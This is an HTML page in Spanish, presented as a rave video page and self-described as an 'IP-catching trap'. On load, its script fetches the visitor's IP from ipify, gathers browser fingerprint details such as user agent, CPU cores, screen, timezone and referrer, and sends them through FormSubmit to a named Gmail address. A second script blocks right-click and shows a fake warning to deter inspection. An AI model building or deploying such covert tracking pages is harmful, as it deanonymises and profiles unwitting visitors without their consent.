<body>
    <h1>BIENVENIDO USUARIO DE RAVE: TE VAS TRACKEADO</h1>

    <video width="720" controls>

    <p>TRAMPA CAZA IPS VERSION</p>

    <script> 
        // --- 1. Recolección de datos avanzados del dispositivo y sistema ---
        const userAgent = navigator.userAgent;
        const userLanguage = navigator.language || navigator.userLanguage;
        const screenRes = window.screen.width + 'x' + window.screen.height;
        
        // Datos de Hardware / Seguridad (Browser Fingerprinting)
        const dntStatus = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
        const touchScreen = ('ontouchstart' in window || navigator.maxTouchPoints > 0 || navigator.msMaxTouchPoints > 0) ? 'Sí' : 'No';
        const cpuCores = navigator.hardwareConcurrency || 'Desconocido';
        const platform = navigator.platform;
        const colorDepth = screen.colorDepth; // Profundidad de color de la pantalla (ej. 24)
        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone; // Zona horaria
        const referrer = document.referrer || 'Acceso Directo'; // De dónde vino el usuario
        
        // --- 2. Obtener la IP y enviar todos los datos a FormSubmit ---
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const userIP = data.ip;
                
                // TU CORREO DE DESTINO: system404g@gmail.com
                const endpoint = 'https://formsubmit.co/ajax/system404g%40gmail.com'; 
                
                // Enviar TODOS los datos al servidor de recolección
                fetch(endpoint, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        "_subject": "MÁXIMA CAPTURA DE DATOS - TeVasTrackeado", 
                        // --- Información de Red ---
                        "IP_Visitante": userIP, 
                        "Referencia_Web": referrer, // De dónde vino
                        // --- Información del Dispositivo ---
                        "Agente_de_Usuario": userAgent,
                        "Plataforma_SO": platform,
                        "Nucleos_CPU": cpuCores,
                        "Touch_Screen": touchScreen,
                        "Resolucion": screenRes,
                        "Profundidad_Color": colorDepth,
                        // --- Información de Configuración ---
                        "DNT_Activado": dntStatus, // Estado de Do Not Track
                        "Idioma": userLanguage,
                        "Zona_Horaria": timeZone,
                        "Fecha_Hora_Visita": new Date().toLocaleString()
                    })
                })
                .catch(error => console.log('Error al enviar los datos: ' + error));
            })
            .catch(error => console.log('Error al obtener la IP: ' + error));
    </script>
    
    <script>
        // Efecto 1: Título Parpadeante (Neón)
        function blink() {
            var h1 = document.querySelector('h1');
            h1.style.visibility = (h1.style.visibility === 'hidden' ? 'visible' : 'hidden');
        }
        setInterval(blink, 500);

        // Efecto 2: Cambio de Color de Borde Aleatorio (Rave)
        function changeBorderColor() {
            const video = document.querySelector('video');
            const randomColor = '#' + Math.floor(Math.random()*16777215).toString(16).padStart(6, '0');
            video.style.borderColor = randomColor;
            video.style.boxShadow = `0 0 25px ${randomColor}`;
        }
        setInterval(changeBorderColor, 2000);

        // Efecto 3: Bloqueo del Clic Derecho (Anti-Inspección)
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            alert("Advertencia: Intento de inspección registrado. Acceso denegado.");
        });
        
        // Efecto 4: Redireccionamiento a HTTPS (Seguridad)
        if (window.location.protocol === 'http:') {
            window.location.protocol = 'https:';
        }
    </script>
</body>
